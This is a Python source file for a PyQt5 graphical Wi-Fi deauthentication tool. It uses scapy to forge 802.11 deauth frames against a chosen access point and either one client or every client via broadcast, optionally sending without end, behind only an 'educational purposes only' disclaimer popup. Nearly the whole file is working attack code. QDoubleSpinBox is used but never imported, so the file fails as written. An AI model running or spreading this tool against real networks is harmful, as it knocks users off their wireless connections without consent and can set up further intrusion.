import sys
import time
import re
import os
import platform
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QSpinBox, QPushButton, QTextEdit, QMessageBox
)
from PyQt5.QtCore import QThread, pyqtSignal
from scapy.all import *  # For packet crafting and sending

# --- Global Variable ---
stop_attack = False

# --- Helper Functions ---
def get_current_time():
    """Return the current time in HH:MM:SS format."""
    return time.strftime("%H:%M:%S")

def validate_mac(mac):
    """Validate the MAC address format."""
    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
        raise ValueError(f"Invalid MAC address format: {mac}")
    return mac

def check_root():
    """Check if the program is running with root privileges."""
    if os.geteuid() != 0:
        raise PermissionError("This program must be run as root!")

def check_interface_exists(interface):
    """Check if the specified network interface exists."""
    interfaces = os.listdir("/sys/class/net/")
    if interface not in interfaces:
        raise ValueError(f"Interface {interface} not found!")

def check_interface_mode(interface):
    """Check if the network interface is in monitor mode."""
    try:
        result = os.popen(f"iwconfig {interface}").read()
        if "Mode:Monitor" not in result:
            raise ValueError("Interface is not in monitor mode!")
    except Exception as e:
        raise ValueError(f"Error checking interface mode: {e}")

# --- Deauthentication Thread ---
class DeauthThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, interface, bssid, channel, client=None, count=0, timeout=30, interval=0):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.client = client
        self.count = count
        self.timeout = timeout
        self.interval = interval

    def run(self):
        """Execute the deauthentication attack."""
        global stop_attack
        stop_attack = False
        try:
            # Set the channel
            os.system(f"iwconfig {self.interface} channel {self.channel}")
            self.log_signal.emit(f"[{get_current_time()}] [INFO] Starting deauthentication attack...")

            # Determine target client
            target = self.client if self.client else "ff:ff:ff:ff:ff:ff"
            if target == "ff:ff:ff:ff:ff:ff":
                self.log_signal.emit(f"[{get_current_time()}] [INFO] No specific client provided, using broadcast mode.")
            else:
                self.log_signal.emit(f"[{get_current_time()}] [INFO] Targeting client: {target}")

            # Craft deauthentication packet
            packet = RadioTap() / Dot11(addr1=target, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
            conf.iface = self.interface

            # Send packets
            i = 0
            while (self.count == 0 or i < self.count) and not stop_attack:
                sendp(packet, inter=self.interval, count=1, verbose=False)
                self.log_signal.emit(f"[{get_current_time()}] [INFO] Sent deauth packet {i + 1} to {self.bssid} (Client: {target})")
                time.sleep(self.interval)
                i += 1

            if stop_attack:
                self.log_signal.emit(f"[{get_current_time()}] [INFO] Attack stopped by user.")
            else:
                self.log_signal.emit(f"[{get_current_time()}] [INFO] Deauthentication attack completed.")
        except Exception as e:
            self.log_signal.emit(f"[{get_current_time()}] [ERROR] Error during attack: {e}")

    def stop(self):
        """Stop the deauthentication attack."""
        global stop_attack
        stop_attack = True

# --- Main GUI Class ---
class DeauthGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Wi-Fi Deauthentication Tool")
        self.setGeometry(100, 100, 800, 600)
        self.initUI()
        self.thread = None

    def initUI(self):
        """Initialize the user interface."""
        # Main widget and layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        # Input fields
        input_layout = QVBoxLayout()
        self.interface_input = QLineEdit()
        self.bssid_input = QLineEdit()
        self.channel_input = QSpinBox()
        self.client_input = QLineEdit()
        self.count_input = QSpinBox()
        self.timeout_input = QSpinBox()
        self.interval_input = QDoubleSpinBox()

        # Set placeholders and default values
        self.interface_input.setPlaceholderText("Example: wlan0")
        self.bssid_input.setPlaceholderText("Example: 00:11:22:33:44:55")
        self.channel_input.setRange(1, 14)
        self.client_input.setPlaceholderText("Optional: Example: 66:77:88:99:AA:BB")
        self.count_input.setRange(0, 10000)
        self.count_input.setValue(0)
        self.timeout_input.setRange(1, 300)
        self.timeout_input.setValue(30)
        self.interval_input.setRange(0, 10)
        self.interval_input.setValue(0)

        # Add input fields to layout
        input_layout.addWidget(QLabel("Network Interface:"))
        input_layout.addWidget(self.interface_input)
        input_layout.addWidget(QLabel("BSSID:"))
        input_layout.addWidget(self.bssid_input)
        input_layout.addWidget(QLabel("Channel:"))
        input_layout.addWidget(self.channel_input)
        input_layout.addWidget(QLabel("Client MAC (optional):"))
        input_layout.addWidget(self.client_input)
        input_layout.addWidget(QLabel("Packet Count (0 for continuous):"))
        input_layout.addWidget(self.count_input)
        input_layout.addWidget(QLabel("Timeout (seconds):"))
        input_layout.addWidget(self.timeout_input)
        input_layout.addWidget(QLabel("Packet Interval (seconds):"))
        input_layout.addWidget(self.interval_input)

        # Buttons
        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)

        # Log display
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)

        # Add to main layout
        main_layout.addLayout(input_layout)
        main_layout.addLayout(button_layout)
        main_layout.addWidget(QLabel("Log:"))
        main_layout.addWidget(self.log_display)

        # Connect buttons to functions
        self.start_button.clicked.connect(self.start_attack)
        self.stop_button.clicked.connect(self.stop_attack)

    def start_attack(self):
        """Start the deauthentication attack."""
        try:
            # Get and validate inputs
            interface = self.interface_input.text()
            bssid = validate_mac(self.bssid_input.text())
            channel = self.channel_input.value()
            client = self.client_input.text() if self.client_input.text() else None
            if client:
                client = validate_mac(client)
            count = self.count_input.value()
            timeout = self.timeout_input.value()
            interval = self.interval_input.value()

            # System checks
            if platform.system() != "Linux":
                raise ValueError("This program is only supported on Linux!")
            check_root()
            check_interface_exists(interface)
            check_interface_mode(interface)

            # Start the attack thread
            self.thread = DeauthThread(interface, bssid, channel, client, count, timeout, interval)
            self.thread.log_signal.connect(self.update_log)
            self.thread.start()
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(True)
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))

    def stop_attack(self):
        """Stop the deauthentication attack."""
        if self.thread:
            self.thread.stop()
            self.thread.wait()
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)

    def update_log(self, message):
        """Update the log display with a new message."""
        self.log_display.append(message)

    def closeEvent(self, event):
        """Handle window close event."""
        if self.thread and self.thread.isRunning():
            self.thread.stop()
            self.thread.wait()
        event.accept()

# --- Application Entry Point ---
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = DeauthGUI()
    window.show()

    # Show disclaimer
    disclaimer = (
        "WARNING:\n\n"
        "This program is for educational purposes only. "
        "Use it only on networks you own or have explicit permission to test. "
        "Unauthorized use may violate laws and lead to legal consequences."
    )
    QMessageBox.warning(window, "Disclaimer", disclaimer)

    sys.exit(app.exec_())
